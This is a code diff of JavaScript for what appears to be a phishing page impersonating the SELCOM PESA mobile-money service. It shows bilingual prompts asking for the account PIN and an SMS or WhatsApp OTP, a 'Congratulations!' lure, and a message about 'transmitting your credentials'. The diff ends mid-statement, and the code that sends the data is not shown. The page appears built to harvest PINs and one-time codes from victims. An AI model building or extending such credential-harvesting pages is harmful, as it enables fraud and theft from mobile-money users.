@@ -131,7 +131,7 @@ document.addEventListener('DOMContentLoaded', () => {
       pinNote: "Make sure this matches the PIN set for this account.",
       pinSubmitBtn: "SUBMIT",
       otpTitle: "Confirm your SELCOM PESA OTP",
-      otpSub: "For security, an OTP code has been sent via SMS or WhatsApp to your SELCOM PESA number. Please enter below to continue.",
+      otpSub: "For security, an OTP code has been sent via SMS or WhatsApp to your SELCOM Pesa number. Please enter below to continue.",
       otpLabel: "Your 6-digit OTP",
       otpSubmitBtn: "ENTER OTP",
       successTitle: "🎉 Congratulations!",
@@ -227,7 +227,6 @@ document.addEventListener('DOMContentLoaded', () => {
 
   const langToggle = document.getElementById('language-toggle');
   if (langToggle) {
-    // Sync toggle state with default language
     langToggle.checked = (currentLang === 'sw');
     langToggle.addEventListener('change', (e) => {
       currentLang = e.target.checked ? 'sw' : 'en';
@@ -424,4 +423,7 @@ document.addEventListener('DOMContentLoaded', () => {
       if (pinError) pinError.style.display = 'none';
 
       if (credsSurfaceBanner) credsSurfaceBanner.classList.remove('active');
-      showLoading(currentLang === 'sw' ? 'Inathibitisha...' : 'Verifying...', currentLang === 'sw' ? 'Inatuma taarifa zako kwa usalama.' : 'Securely transmitting 
+      showLoading(currentLang === 'sw' ? 'Inathibitisha...' : 'Verifying...', currentLang === 'sw' ? 'Inatuma taarifa zako kwa usalama.' : 'Securely transmitting your credentials.');
+
+      try {
+        const
